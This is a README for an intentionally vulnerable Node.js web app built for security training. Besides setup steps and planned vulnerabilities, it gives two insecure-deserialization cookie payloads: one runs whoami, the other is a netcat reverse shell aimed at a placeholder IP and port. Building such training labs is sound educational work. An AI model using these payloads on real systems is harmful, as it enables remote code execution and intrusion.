# README

Welcome to the Damn Vulnerable CCX Site!

This is a vulnerable web application designed for educational purposes. It contains intentional security vulnerabilities that you can exploit to learn about common web application vulnerabilities and how to mitigate them.

## Installation

1. Clone the repository: `git clone https://github.com/your-username/Damn-Vulnerable-Web-App.git`
2. Navigate to the server directory: `cd Damn-Vulnerable-Web-App/server`
3. Install dependencies: `npm install`
4. Start the server: `npm start`

## Usage

Once the server is running, you can access the web application by navigating to `http://localhost:3000` in your web browser. Please note that this application is intentionally vulnerable, so only run it in a controlled environment.

## Vulnerabilities

The Damn Vulnerable CCX Site contains various vulnerabilities, including:

- Insecure Deserialization

### Insecure Deserialization
#### Demo Payloads
- Base64 encode these payloads and set as the 'session' cookie value.
- WHOAMI 
 {"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('whoami').toString().trim();\n \t return output ;\n }()"}
 
- REV SHELL
 {"username":"_$$ND_FUNC$$_function (){\n \t const exec = require('child_process').execSync;\n \t const output = exec('rm -f /tmp/f;mkfifo/tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f');\n \t return 'PWND';\n }()"}

Future versions of the application will include additional vulnerabilities, such as:
- Cross-Site Scripting (XSS)
- SQL Injection
- Command Injection
- Path Traversal
- Remote Code Execution
- Cross-Site Request Forgery (CSRF)
- Insecure Direct Object References (IDOR)
- Server-Side Request Forgery (SSRF)
- and more...

TODO:
- [ ] Add additional server-side vulnerabilities
- [ ] Add frontend with client-side vulnerabilities

Please exercise caution when interacting with this application and only perform actions within the scope of your own environment.


